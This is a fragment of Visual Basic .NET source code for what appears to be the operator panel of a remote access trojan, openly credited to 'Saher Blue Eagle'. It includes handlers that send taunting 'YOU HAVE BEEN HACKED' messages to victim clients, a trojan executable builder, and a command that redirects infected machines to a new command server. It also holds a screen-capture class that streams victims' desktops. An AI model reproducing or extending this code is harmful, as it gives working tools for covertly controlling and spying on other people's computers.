                    System.Threading.Thread.CurrentThread.Sleep(50)
                Next
            End If
        Catch ex As Exception : End Try
    End Sub

    Private Sub SendAMessageToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendAMessageToolStripMenuItem.Click
        Dim msg_text As String = "YOU HAVE BEEN HACKED"
        Dim msh_mod = InputBox("Enter You Kidding Message to Victim", "Message Delivery Enter", "YOU HAVE BEEN HACKED")
        If msh_mod.Length >= msg_text.Length Then
            For Each x As ListViewItem In client_list_l1.SelectedItems
                Server.Send(x.ToolTipText, "msg" & SplitData & msh_mod)
            Next
        Else
            For Each x As ListViewItem In client_list_l1.SelectedItems
                Server.Send(x.ToolTipText, "msg" & SplitData & msg_text)
            Next
        End If
    End Sub
    Friend Build_exe_BOOL As Boolean
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click

        If Build_exe_BOOL = False Then
            بناء_تروجان_exe.showme()
            Build_exe_BOOL = True
            checkgithub()
        Else
            Exit Sub
        End If
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        End
    End Sub


    Private Sub Panel1_Paint(ByVal sender As System.Object, ByVal e As System.Windows.Forms.PaintEventArgs) Handles Panel1.Paint

    End Sub

    Private Sub HostreplaceToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HostreplaceToolStripMenuItem.Click
        '"host_replace" 
        Dim host As String = InputBox("Enter your new Host" & vbNewLine & "Note if you mistyped your host , you will lose connection", "Host Entry", "127.0.0.1")
        Try

            Dim port As Integer = Integer.Parse(InputBox("Enter your new Port" & vbNewLine & "Note if you mistyped your port , you will lose connection", "Port Entry", "1166"))
            If client_list_l1.SelectedItems.Count = 1 Then
                For Each item As ListViewItem In client_list_l1.SelectedItems

                    Server.Send_DX(item.ToolTipText, "host_replace" & SplitData & host & "," & port & SplitData & "192.168.1.9,1166,127.0.0.1,1177" & SplitData)
                Next
            End If

        Catch ex As Exception

        End Try

    End Sub

    Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        About.Show()
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        If gitc = 150 Then
            checkgithub()
            gitc = 0
        Else
            gitc += 1
        End If
    End Sub

    Private Sub Form1_MouseHover(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.MouseHover
        For Each item As ListViewItem In client_list_l1.Items

            If item.ImageIndex = 0 Then
            Else
                If Server.SK(item.ToolTipText).Connected = False Then

                    client_list_l1.Items.Remove(item)
                    client_list_l1.Update()
                    Server.Disconnect(item.ToolTipText)

                Else

                End If
            End If

        Next
    End Sub
    Dim ifshowed As Boolean = False
    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        If ifshowed = True Then
            ListBox1.Visible = False
            ListBox1.SendToBack()
            client_list_l1.BringToFront()
            Me.Refresh()
            ifshowed = False
        Else
            ListBox1.Visible = True
            ListBox1.BringToFront()
            client_list_l1.SendToBack()
            Me.Refresh()
            ifshowed = True
        End If
    End Sub
End Class
'##################################################
'################### CODED  #######################
'##################### BY #########################
'############### Saher Blue Eagle  ################
'###############  XPR OPEN SOURCE  ################
'##################################################
'##################################################
Public Class CRDP
    Shared OA As New List(Of Bitmap)
    Shared OAA As New List(Of Point)
    Shared OM As New Bitmap(1, 1)
    Private Shared Function QZ(ByVal q As Integer) As Size
        Dim zs As New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Select Case q
            Case 0
                Return zs
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function
    Private Shared Function Gd(Optional ByVal Wi As Integer = 0, Optional ByVal He As Integer = 0, Optional ByVal Sh As Boolean = True) As Image
        Dim W As Integer = Screen.PrimaryScreen.Bounds.Width
        Dim H As Integer = Screen.PrimaryScreen.Bounds.Height
        Dim B As New Bitmap(W, H)
        Dim g As Graphics = Graphics.FromImage(B)
        g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed
        g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
        If Sh Then
            Try
                Cursors.Default.Draw(g, New Rectangle(Cursor.Position, New Size(32, 32)))
            Catch ex As Exception
            End Try
        End If
        g.Dispose()
        If Wi = 0 And He = 0 Then
            Return B
        Else
            Return B.GetThumbnailImage(Wi, He, Nothing, Nothing)
        End If
    End Function
    Private Shared Function md5(ByVal bB As Byte()) As String
        Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
        bB = md5Obj.ComputeHash(bB)
        Return Convert.ToBase64String(bB)
    End Function
    Private Shared Function GetEncoderInfo(ByVal M As String) As System.Drawing.Imaging.ImageCodecInfo
        Dim j As Integer
        Dim encoders As System.Drawing.Imaging.ImageCodecInfo()
        encoders = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()
        For j = 0 To encoders.Length
            If encoders(j).MimeType = M Then
                Return encoders(j)
            End If
        Next j
        Return Nothing
    End Function
    Protected Friend Shared Sub Clear()
        oQ = -1
        oCo = -1
        oQu = -1
        OM = New Bitmap(1, 1)
    End Sub

    Private Shared oQ As Integer = 0
    Private Shared oCo As Integer = 0
    Private Shared oQu As Integer = 0
    Protected Friend Shared Function Cap(ByVal q As Integer, ByVal co As Integer, ByVal Qu As Integer) As Byte()
ee:
        Dim ZS As New Size(QZ(q))
        ZS.Width = Mid(ZS.Width.ToString, 1, ZS.Width.ToString.Length - 1) & 0
        ZS.Height = Mid(ZS.Height.ToString, 1, ZS.Height.ToString.Length - 1) & 0
        If OM.Size.Width <> ZS.Width Or OM.Height <> ZS.Height Or oCo <> co Or oQu <> Qu Then
            OA.Clear()
            OAA.Clear()
            OM = New Bitmap(ZS.Width, ZS.Height)
        End If
        oQ = q
        oCo = co
        oQu = Qu

        Dim A As New List(Of Bitmap)
        Dim AA As New List(Of Point)
        Dim m As Bitmap
        If OA.Count > 0 Then
            A.AddRange(OA.ToArray)
            OA.Clear()
            AA.AddRange(OAA.ToArray)
            OAA.Clear()

            m = OM
            GoTo e
        End If
        m = Gd(ZS.Width, ZS.Height)
        Dim w As Integer = ZS.Width
        Dim h As Integer = ZS.Height
        Dim K As Integer = 0
        For i As Integer = 0 To co - 1
            For ii As Integer = 0 To co - 1
                Dim y As Integer = h / co * i
                Dim x As Integer = w / co * ii
                Dim wc As Integer = w / co
                Dim hc As Integer = h / co
                If wc.ToString.Contains(".") Then
                    wc = Split(wc, ".")(0)
                End If
                If hc.ToString.Contains(".") Then
                    hc = Split(hc, ".")(0)
                End If
                Dim MM As New IO.MemoryStream
                Dim Mj = m.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                Dim MJJ = OM.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                Dim b1 As Byte()
                Dim b2 As Byte()
                Mj.Save(MM, Imaging.ImageFormat.Jpeg)
                b1 = MM.ToArray
                MM.Dispose()
                MM = New IO.MemoryStream
                MJJ.Save(MM, Imaging.ImageFormat.Jpeg)

                b2 = MM.ToArray

                MM.Dispose()
                If md5(b1) = md5(b2) Then
                    Mj.Dispose()
                Else
                    A.Add(Mj)
                    AA.Add(New Point(x, y))
                End If
                MJJ.Dispose()
nx:
            Next
        Next
e:

        If A.Count = 0 Then
            Return New Byte() {0}
        End If
        Dim hh As Integer = 0
        Dim QA As New List(Of Integer)
        For i As Integer = 0 To co * co / 5
            If i = A.Count Then Exit For
            QA.Add(i)
            hh += A(i).Height
        Next
        Dim xx As New Bitmap(A(0).Width, hh)
        Dim gg = Graphics.FromImage(xx)
        Dim tp As Integer = 0
        Dim s As String = m.Width & "." & m.Height & ","
        For Each i As Integer In QA
            s += AA(i).X & "." & AA(i).Y & "." & A(i).Height & ","
            gg.DrawImage(A(i), 0, tp)
            tp += A(i).Height
        Next
        s += "njq8"
        For i As Integer = 0 To A.Count - 1
            If QA.Contains(i) = False Then
                OA.Add(A(i))
                OAA.Add(AA(i))
            End If
        Next
        gg.Dispose()
        Dim JA = New IO.MemoryStream
        Dim eps As System.Drawing.Imaging.EncoderParameters = New System.Drawing.Imaging.EncoderParameters(1)
        eps.Param(0) = New System.Drawing.Imaging.EncoderParameter(Drawing.Imaging.Encoder.Quality, Qu)
        Dim ici As System.Drawing.Imaging.ImageCodecInfo = GetEncoderInfo("image/jpeg")
        xx.Save(JA, ici, eps)
        Dim J2 As New IO.MemoryStream
        J2.Write(System.Text.Encoding.Default.GetBytes(s), 0, s.Length)
        J2.Write(JA.ToArray, 0, JA.Length)
        OM = m
        xx.Dispose()
        Return J2.ToArray
    End Function
End Class